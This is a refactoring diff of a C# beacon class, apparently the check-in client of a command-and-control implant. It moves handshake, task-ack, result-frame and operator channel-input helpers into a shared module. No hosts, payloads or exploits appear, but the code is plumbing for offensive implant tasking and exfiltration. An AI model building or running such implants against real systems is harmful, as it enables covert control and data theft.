@@ -304,20 +304,6 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         return CheckInExit.Terminate;
     }
 
-    // What one POST-response cycle produced, driving the retry policy in
-    // RunAsync. Mirrors the gRPC beacon's cycle result.
-    private enum BeaconCycleResult
-    {
-        // The POST failed or the response was unusable; retry.
-        Dropped,
-
-        // The handshake succeeded and the response was processed.
-        Handshaken,
-
-        // The server refused the handshake permanently; terminate.
-        Terminal,
-    }
-
     // One POST-response cycle. Throws on transport errors (the caller logs
     // and retries); a refused handshake returns Terminal. The envelope's
     // documented bounds apply to the batch (an artifact's exfil chunk run
@@ -481,7 +467,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             var frame = inbound[index];
             if (frame.Kind == FrameKind.ChannelInput)
             {
-                RouteChannelInput(frame);
+                BeaconFrames.RouteChannelInput(frame, _liveChannels, _log);
                 continue;
             }
 
@@ -501,7 +487,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             // request body before anything runs. The dedup half lives inside
             // AcceptTasking, after verification.
             if (acks)
-                AddUpstream(AckFrame(task.TaskId));
+                AddUpstream(BeaconFrames.AckFrame(task.TaskId));
             AcceptTasking(task);
         }
     }
@@ -635,18 +621,9 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     {
         // The implant speaks first on every POST: the handshake re-opens (or
         // reuses) the session and re-advertises the baked class verbs
-        // intersected with the compiled handlers (architecture.md Sec 5.3).
-        var handshake = new HandshakeRequest
-        {
-            Version = new ProtocolVersion { Major = 1, Minor = 0 },
-            ImplantId = _implantId,
-            ReplayNonces = true,
-            // The receive-ack arm (architecture.md Sec 10.3), offered the same
-            // way: an echoing server gets an ack for every parsed task,
-            // queued into the next request body.
-            TaskAcks = true,
-        };
-        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
+        // intersected with the compiled handlers (architecture.md Sec 5.3),
+        // both negotiation arms offered.
+        var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
         // The degraded opt-in rides the advertisement: the server's parking
         // hub reads it off the session and claims the channel verbs against
         // this cycle only when it is there.
@@ -705,33 +682,6 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         }
     }
 
-    // One ChannelInput frame off a response: operator input for a live
-    // channel, routed by task id. Input for a task with no live channel is
-    // dropped and logged -- a channel that already ended, or input that
-    // raced the cycle.
-    private void RouteChannelInput(Frame frame)
-    {
-        ChannelInput input;
-        try
-        {
-            input = ChannelInput.Parser.ParseFrom(frame.Payload);
-        }
-        catch (Google.Protobuf.InvalidProtocolBufferException)
-        {
-            return;
-        }
-
-        if (_liveChannels.TryGetValue(input.TaskId, out var channel))
-        {
-            if (!channel.Receive(input.Data.ToArray(), input.Eof))
-                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
-        }
-        else
-        {
-            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
-        }
-    }
-
     // One frame into the upstream batch, under the gate the background
     // channels' output writes share with the cycle thread's snapshot.
     private void AddUpstream(Frame frame)
@@ -742,27 +692,6 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         }
     }
 
-    private static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
-        => new()
-        {
-            Payload = ByteString.CopyFrom(new TaskResult
-            {
-                TaskId = taskId,
-                Outcome = outcome,
-                Output = output,
-            }.ToByteArray()),
-            Kind = FrameKind.TaskResult,
-        };
-
-    // The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
-    // one parsed task, queued into the next request body.
-    private static Frame AckFrame(string taskId)
-        => new()
-        {
-            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
-            Kind = FrameKind.TaskAck,
-        };
-
     // Queues one task result and caches it in the held-task ledger: the
     // delivery mark lands only when the cycle carrying the batch completed,
     // so a dropped POST re-sends through the batch the ledger's re-send
@@ -772,7 +701,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
 
     private void QueueResult(string taskId, TaskOutcome outcome, string output)
     {
-        AddUpstream(ResultFrame(taskId, outcome, output));
+        AddUpstream(BeaconFrames.ResultFrame(taskId, outcome, output));
         _held.Remember(taskId, outcome, output);
     }
 
